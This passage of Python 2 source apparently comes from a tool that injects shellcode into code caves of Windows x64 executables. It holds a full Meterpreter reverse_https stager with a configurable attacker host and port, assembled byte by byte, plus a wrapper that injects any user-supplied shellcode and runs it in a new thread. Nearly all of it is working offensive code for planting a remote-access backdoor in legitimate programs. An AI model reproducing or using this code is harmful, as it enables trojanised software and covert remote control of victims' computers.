                            "\xf2\xa4"                              #rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  #call set_handler   ; Configure error handling

                            #set_handler:
                            "\x48\x31\xC0" #  xor rax,rax
                            
                            "\x50"                                  #  push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                  #  push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                          # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                          #mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                          #mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                          #mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"          #mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                              #  call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                      #add rsp, 50
                            
                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )
        
        
        breakupvar = eat_code_caves(flItms, 0, 2)
        
        #Jump to the win64 return to normal execution code segment.
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))
        else:
            self.shellcode1 += "\xE9"
            self.shellcode1 += struct.pack("<H", 583 + len(self.HOST))
            self.shellcode1 += "\x00\x00"
            #self.shellcode1 += "\xE9\x47\x02\x00\x00"

        
        breakupvar = eat_code_caves(flItms, 0, 1)
        
        #get_payload:  #Jump back with the address for the payload on the stack.
        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = "\xE8\xB8\xFF\xFF\xFF"
        
        """
         /*
         * windows/x64/meterpreter/reverse_https - 587 bytes (stage 1)
         * http://www.metasploit.com
         * VERBOSE=false, LHOST=127.0.0.1, LPORT=8080, 
         * SessionExpirationTimeout=604800, 
         * SessionCommunicationTimeout=300, 
         * MeterpreterUserAgent=Mozilla/4.0 (compatible; MSIE 6.1; 
         * Windows NT), MeterpreterServerName=Apache, 
         * ReverseListenerBindPort=0, 
         * HttpUnknownRequestResponse=<html><body><h1>It 
         * works!</h1></body></html>, EnableStageEncoding=false, 
         * PrependMigrate=false, EXITFUNC=thread, AutoLoadStdapi=true, 
         * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true, 
         * EnableUnicodeEncoding=true
         */
        """
                       
        #payload
        self.shellcode2 += ("\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52"
                        "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                        "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                        "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                        "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                        "\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00"
                        "\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b"
                        "\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
                        "\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
                        "\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b"
                        "\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41"
                        "\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41"
                        "\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff"
                        "\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56"
                        "\x49\x89\xe6\x4c\x89\xf1\x49\xba\x4c\x77\x26\x07\x00\x00\x00"
                        "\x00\xff\xd5\x6a\x00\x6a\x00\x48\x89\xe1\x48\x31\xd2\x4d\x31"
                        "\xc0\x4d\x31\xc9\x41\x50\x41\x50\x49\xba\x3a\x56\x79\xa7\x00"
                        "\x00\x00\x00\xff\xd5\xe9\x9e\x00\x00\x00\x5a\x48\x89\xc1\x49"
                        "\xb8")
        self.shellcode2 += struct.pack("<h", self.PORT)    
        self.shellcode2 += ("\x00\x00\x00\x00\x00\x00\x4d\x31\xc9\x41\x51\x41"
                        "\x51\x6a\x03\x41\x51\x49\xba\x57\x89\x9f\xc6\x00\x00\x00\x00"
                        "\xff\xd5\xeb\x7c\x48\x89\xc1\x48\x31\xd2\x41\x58\x4d\x31\xc9"
                        "\x52\x68\x00\x32\xa0\x84\x52\x52\x49\xba\xeb\x55\x2e\x3b\x00"
                        "\x00\x00\x00\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1\x48"
                        "\xba\x1f\x00\x00\x00\x00\x00\x00\x00\x6a\x00\x68\x80\x33\x00"
                        "\x00\x49\x89\xe0\x49\xb9\x04\x00\x00\x00\x00\x00\x00\x00\x49"
                        "\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5\x48\x89\xf1\x48"
                        "\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x52\x52\x49\xba\x2d\x06\x18"
                        "\x7b\x00\x00\x00\x00\xff\xd5\x85\xc0\x75\x24\x48\xff\xcf\x74"
                        "\x13\xeb\xb1\xe9\x81\x00\x00\x00\xe8\x7f\xff\xff\xff\x2f\x75"
                        "\x47\x48\x58\x00\x00\x49\xbe\xf0\xb5\xa2\x56\x00\x00\x00\x00"
                        "\xff\xd5\x48\x31\xc9\x48\xba\x00\x00\x40\x00\x00\x00\x00\x00"
                        "\x49\xb8\x00\x10\x00\x00\x00\x00\x00\x00\x49\xb9\x40\x00\x00"
                        "\x00\x00\x00\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00\x00"
                        "\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda"
                        "\x49\xb8\x00\x20\x00\x00\x00\x00\x00\x00\x49\x89\xf9\x49\xba"
                        "\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xd5\x48\x83\xc4\x20\x85"
                        "\xc0\x74\x99\x48\x8b\x07\x48\x01\xc3\x48\x85\xc0\x75\xce\x58"
                        "\x58\xc3\xe8\xd7\xfe\xff\xff")
        self.shellcode2 += self.HOST
        self.shellcode2 +=  "\x00"


        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def user_supplied_shellcode(self, flItms, CavesPicked={}):
        """
        User supplies the shellcode, make sure that it EXITs via a thread.
        """
        
        flItms['stager'] = True

        if flItms['supplied_shellcode'] is None:
            print "[!] User must provide shellcode for this module (-U)"
            sys.exit(0)
        else:
            self.supplied_shellcode =  open(self.SUPPLIED_SHELLCODE, 'r+b').read()


        #overloading the class stackpreserve
        self.stackpreserve = ("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        breakupvar = eat_code_caves(flItms, 0, 1)
       
        self.shellcode1 = ( "\x90"                              #<--THAT'S A NOP. \o/
                            "\xe8\xc0\x00\x00\x00"              #jmp to allocate
                            #api_call
                            "\x41\x51"                          #push r9
                            "\x41\x50"                          #push r8
                            "\x52"                              #push rdx
                            "\x51"                              #push rcx
                            "\x56"                              #push rsi
                            "\x48\x31\xD2"                      #xor rdx,rdx
                            "\x65\x48\x8B\x52\x60"              #mov rdx,qword ptr gs:[rdx+96]
                            "\x48\x8B\x52\x18"                  #mov rdx,qword ptr [rdx+24]
                            "\x48\x8B\x52\x20"                  #mov rdx,qword ptr[rdx+32]
                            #next_mod
                            "\x48\x8b\x72\x50"                  #mov rsi,[rdx+80]
                            "\x48\x0f\xb7\x4a\x4a"              #movzx rcx,word [rdx+74]      
                            "\x4d\x31\xc9"                      #xor r9,r9
                            #loop_modname
                            "\x48\x31\xc0"                      #xor rax,rax          
                            "\xac"                              #lods
                            "\x3c\x61"                          #cmp al, 61h (a)
                            "\x7c\x02"                          #jl 02
                            "\x2c\x20"                          #sub al, 0x20 
                            #not_lowercase
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13
                            "\x41\x01\xc1"                      #add r9d, eax
                            "\xe2\xed"                          #loop until read, back to xor rax, rax
                            "\x52"                              #push rdx ; Save the current position in the module list for later
                            "\x41\x51"                          #push r9 ; Save the current module hash for later
                                                                #; Proceed to itterate the export address table,
                            "\x48\x8b\x52\x20"                  #mov rdx, [rdx+32] ; Get this modules base address
                            "\x8b\x42\x3c"                      #mov eax, dword [rdx+60] ; Get PE header
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x8b\x80\x88\x00\x00\x00"          #mov eax, dword [rax+136] ; Get export tables RVA
                            "\x48\x85\xc0"                      #test rax, rax ; Test if no export address table is present
                            
                            "\x74\x67"                          #je get_next_mod1 ; If no EAT present, process the next module
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address
                            "\x50"                              #push rax ; Save the current modules EAT
                            "\x8b\x48\x18"                      #mov ecx, dword [rax+24] ; Get the number of function names
                            "\x44\x8b\x40\x20"                  #mov r8d, dword [rax+32] ; Get the rva of the function names
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                                                                #; Computing the module hash + function hash
                            #get_next_func: ;
                            "\xe3\x56"                          #jrcxz get_next_mod ; When we reach the start of the EAT (we search backwards), process the next module
                            "\x48\xff\xc9"                      #  dec rcx ; Decrement the function name counter
                            "\x41\x8b\x34\x88"                  #  mov esi, dword [r8+rcx*4]; Get rva of next module name
                            "\x48\x01\xd6"                      #  add rsi, rdx ; Add the modules base address
                            "\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash of the function name
                                                                #  ; And compare it to the one we wan                        
                            #loop_funcname: ;
                            "\x48\x31\xc0"                      #xor rax, rax ; Clear rax
                            "\xac"                              #lodsb ; Read in the next byte of the ASCII function name
                            "\x41\xc1\xc9\x0d"                  #ror r9d, 13 ; Rotate right our hash value
                            "\x41\x01\xc1"                      #add r9d, eax ; Add the next byte of the name
                            "\x38\xe0"                          #cmp al, ah ; Compare AL (the next byte from the name) to AH (null)
                            "\x75\xf1"                          #jne loop_funcname ; If we have not reached the null terminator, continue
                            "\x4c\x03\x4c\x24\x08"              #add r9, [rsp+8] ; Add the current module hash to the function hash
                            "\x45\x39\xd1"                      #cmp r9d, r10d ; Compare the hash to the one we are searchnig for
                            "\x75\xd8"                          #jnz get_next_func ; Go compute the next function hash if we have not found it
                                                                #; If found, fix up stack, call the function and then value else compute the next one...
                            "\x58"                              #pop rax ; Restore the current modules EAT
                            "\x44\x8b\x40\x24"                  #mov r8d, dword [rax+36] ; Get the ordinal table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x66\x41\x8b\x0c\x48"              #mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                            "\x44\x8b\x40\x1c"                  #mov r8d, dword [rax+28] ; Get the function addresses table rva
                            "\x49\x01\xd0"                      #add r8, rdx ; Add the modules base address
                            "\x41\x8b\x04\x88"                  #mov eax, dword [r8+4*rcx]; Get the desired functions RVA
                            "\x48\x01\xd0"                      #add rax, rdx ; Add the modules base address to get the functions actual VA
                                                                #; We now fix up the stack and perform the call to the drsired function...
                            #finish:
                            "\x41\x58"                          #pop r8 ; Clear off the current modules hash
                            "\x41\x58"                          #pop r8 ; Clear off the current position in the module list
                            "\x5E"                              #pop rsi ; Restore RSI
                            "\x59"                              #pop rcx ; Restore the 1st parameter
                            "\x5A"                              #pop rdx ; Restore the 2nd parameter
                            "\x41\x58"                          #pop r8 ; Restore the 3rd parameter
                            "\x41\x59"                          #pop r9 ; Restore the 4th parameter
                            "\x41\x5A"                          #pop r10 ; pop off the return address
                            "\x48\x83\xEC\x20"                  #sub rsp, 32 ; reserve space for the four register params (4 * sizeof(QWORD) = 32)
                                                                # ; It is the callers responsibility to restore RSP if need be (or alloc more space or align RSP).
                            "\x41\x52"                          #push r10 ; push back the return address
                            "\xFF\xE0"                          #jmp rax ; Jump into the required function
                                                                #; We now automagically return to the correct caller...
                            #get_next_mod: ;
                            "\x58"                              #pop rax ; Pop off the current (now the previous) modules EAT
                            #get_next_mod1: ;
                            "\x41\x59"                          #pop r9 ; Pop off the current (now the previous) modules hash
                            "\x5A"                              #pop rdx ; Restore our position in the module list
                            "\x48\x8B\x12"                      #mov rdx, [rdx] ; Get the next module
                            "\xe9\x57\xff\xff\xff"              #jmp next_mod ; Process this module
                            )

        self.shellcode1 += (#allocate
                            "\x5d"                              #pop rbp
                            "\x49\xc7\xc6"                      #mov r14, 1abh size of payload...   
                            )
        self.shellcode1 += struct.pack("<H", len(self.supplied_shellcode))
        self.shellcode1 += ("\x00\x00"
                            "\x6a\x40"                          #push 40h
                            "\x41\x59"                          #pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              #push 1000h
                            "\x41\x58"                          #pop r8.. now 1000h
                            "\x4C\x89\xF2"                      #mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              #push E553a458
                            "\x41\x5A"                          #pop r10
                            "\xff\xd5"                          #call rbp
                            "\x48\x89\xc3"                      #mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      #mov rdi, rax      ; Prepare EDI with the new address
                            )
                            ##mov rcx, 0x1ab
        self.shellcode1 += "\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<H", len(self.supplied_shellcode))
        self.shellcode1 += "\x00\x00"
                            
        #call the get_payload right before the payload
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x43" 

                            # got_payload:
        self.shellcode1 += ( "\x5e"                                 #pop rsi            ; Prepare ESI with the source to copy               
                            "\xf2\xa4"                              #rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  #call set_handler   ; Configure error handling

                            #set_handler:
                            "\x48\x31\xC0" #  xor rax,rax
                            
                            "\x50"                                  #  push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                  #  push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                          # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                          #mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                          #mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                          #mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"          #mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                              #  call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                      #add rsp, 50
                            
                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )
        
        
        breakupvar = eat_code_caves(flItms, 0, 2)
        
        #Jump to the win64 return to normal execution code segment.
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))

        breakupvar = eat_code_caves(flItms, 0, 1)
        
        #get_payload:  #Jump back with the address for the payload on the stack.
        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = "\xE8\xB8\xFF\xFF\xFF"
        
        #Can inject any shellcode below.

        self.shellcode2 += self.supplied_shellcode
        self.shellcode1 += "\xe9"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)


##########################################################
#                 END win64 shellcodes                   #
##########################################################